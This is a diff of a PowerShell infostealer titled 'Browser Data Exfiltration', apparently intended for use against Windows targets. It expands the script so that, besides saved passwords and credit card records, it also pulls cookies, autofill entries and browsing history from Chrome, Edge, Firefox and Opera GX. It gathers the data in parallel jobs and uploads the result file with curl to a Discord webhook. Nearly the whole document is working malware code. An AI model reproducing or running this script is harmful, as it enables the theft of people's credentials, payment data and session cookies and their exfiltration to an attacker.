@@ -1,6 +1,6 @@
-# Title: Browser Data Exfiltration with Remote Script Execution
+# Title: Browser Data Exfiltration with Remote Script Execution (2024 Professional Update)
 # Author: Jakoby
-# Description: This script extracts saved usernames/passwords and credit card information from Chrome, Edge, Firefox, and Opera GX on Windows 10/11 targets.
+# Description: This script extracts saved usernames/passwords, credit card information, cookies, autofill data, and browsing history from Chrome, Edge, Firefox, and Opera GX on Windows 10/11 targets.
 
 # Target OS: Windows 10, 11
 
@@ -14,11 +14,33 @@ function Get-BrowserData {
     )
 
     $Path = switch ($Browser) {
-        'chrome'  { if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data" } elseif ($DataType -eq 'creditcards') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Web Data" } }
-        'edge'    { if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" } elseif ($DataType -eq 'creditcards') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Web Data" } }
-        'firefox' { if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json" } }
-        'opera'   { if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Login Data" } elseif ($DataType -eq 'creditcards') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Web Data" } }
-        default { Write-Error "Unsupported browser or data type specified"; return }
+        'chrome'  { 
+            if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data" }
+            elseif ($DataType -eq 'creditcards') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Web Data" }
+            elseif ($DataType -eq 'cookies') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Cookies" }
+            elseif ($DataType -eq 'autofill') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Web Data" }
+            elseif ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" }
+        }
+        'edge'    {
+            if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" }
+            elseif ($DataType -eq 'creditcards') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Web Data" }
+            elseif ($DataType -eq 'cookies') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Cookies" }
+            elseif ($DataType -eq 'autofill') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Web Data" }
+            elseif ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History" }
+        }
+        'firefox' {
+            if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json" }
+            elseif ($DataType -eq 'cookies') { "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite" }
+            elseif ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" }
+        }
+        'opera'   {
+            if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Login Data" }
+            elseif ($DataType -eq 'creditcards') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Web Data" }
+            elseif ($DataType -eq 'cookies') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Cookies" }
+            elseif ($DataType -eq 'autofill') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Web Data" }
+            elseif ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History" }
+        }
+        default { Write-Error "Unsupported browser or data type specified."; return }
     }
 
     if (-not (Test-Path $Path)) {
@@ -27,8 +49,8 @@ function Get-BrowserData {
     }
 
     try {
+        $sqliteCommand = "sqlite3.exe"
         if ($DataType -eq 'passwords' -and ($Browser -eq 'chrome' -or $Browser -eq 'edge' -or $Browser -eq 'opera')) {
-            $sqliteCommand = "sqlite3.exe"
             $query = "SELECT origin_url, username_value, password_value FROM logins"
             if (Test-Path $sqliteCommand) {
                 $passwordData = & $sqliteCommand $Path $query
@@ -40,7 +62,6 @@ function Get-BrowserData {
             $firefoxData = Get-Content -Path $Path | ConvertFrom-Json
             Write-Output "[Firefox Passwords]: $($firefoxData.logins)"
         } elseif ($DataType -eq 'creditcards' -and ($Browser -eq 'chrome' -or $Browser -eq 'edge' -or $Browser -eq 'opera')) {
-            $sqliteCommand = "sqlite3.exe"
             $query = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
             if (Test-Path $sqliteCommand) {
                 $creditCardData = & $sqliteCommand $Path $query
@@ -48,8 +69,20 @@ function Get-BrowserData {
             } else {
                 Write-Warning 'sqlite3.exe not found. Unable to extract credit card information.'
             }
+        } elseif ($DataType -eq 'cookies' -or $DataType -eq 'autofill' -or $DataType -eq 'history') {
+            $query = switch ($DataType) {
+                'cookies' { "SELECT host_key, name, encrypted_value FROM cookies" }
+                'autofill' { "SELECT name, value FROM autofill" }
+                'history' { "SELECT url, title, visit_count FROM urls" }
+            }
+            if (Test-Path $sqliteCommand) {
+                $data = & $sqliteCommand $Path $query
+                Write-Output "[$Browser $DataType]: $data"
+            } else {
+                Write-Warning 'sqlite3.exe not found. Unable to extract data.'
+            }
         } else {
-            Write-Warning "Unsupported data type for $Browser"
+            Write-Warning "Unsupported data type for $Browser."
         }
     } catch {
         Write-Error "Failed to extract $DataType from $Browser: $_"
@@ -65,16 +98,24 @@ if ([string]::IsNullOrEmpty($dc)) {
     exit
 }
 
-# Collect browser data
+# Collect browser data in parallel
 $outputFile = "$env:TMP\BrowserData.txt"
 try {
-    Get-BrowserData -Browser "edge" -DataType "passwords" >> $outputFile
-    Get-BrowserData -Browser "edge" -DataType "creditcards" >> $outputFile
-    Get-BrowserData -Browser "chrome" -DataType "passwords" >> $outputFile
-    Get-BrowserData -Browser "chrome" -DataType "creditcards" >> $outputFile
-    Get-BrowserData -Browser "firefox" -DataType "passwords" >> $outputFile
-    Get-BrowserData -Browser "opera" -DataType "passwords" >> $outputFile
-    Get-BrowserData -Browser "opera" -DataType "creditcards" >> $outputFile
+    $browsers = @("edge", "chrome", "firefox", "opera")
+    $dataTypes = @("passwords", "creditcards", "cookies", "autofill", "history")
+
+    $jobs = @()
+    foreach ($browser in $browsers) {
+        foreach ($dataType in $dataTypes) {
+            $jobs += Start-Job -ScriptBlock {
+                param ($browser, $dataType, $outputFile)
+                Get-BrowserData -Browser $browser -DataType $dataType >> $outputFile
+            } -ArgumentList $browser, $dataType, $outputFile
+        }
+    }
+
+    # Wait for all jobs to complete
+    $jobs | ForEach-Object { $_ | Wait-Job; Remove-Job $_ }
 } catch {
     Write-Error "Failed to collect browser data: $_"
 }
@@ -83,7 +124,9 @@ try {
 try {
     $body = @{ "content" = 'Browser data exfiltration script executed successfully, including browser data.' } | ConvertTo-Json
     Invoke-RestMethod -Uri $dc -Method Post -Body $body -ContentType 'application/json' -UseBasicParsing
-    curl.exe -F "file1=@$outputFile" $dc
+    if (Test-Path $outputFile) {
+        curl.exe -F "file1=@$outputFile" $dc
+    }
 } catch {
     Write-Error "Failed to send notification to Discord webhook: $_"
 }
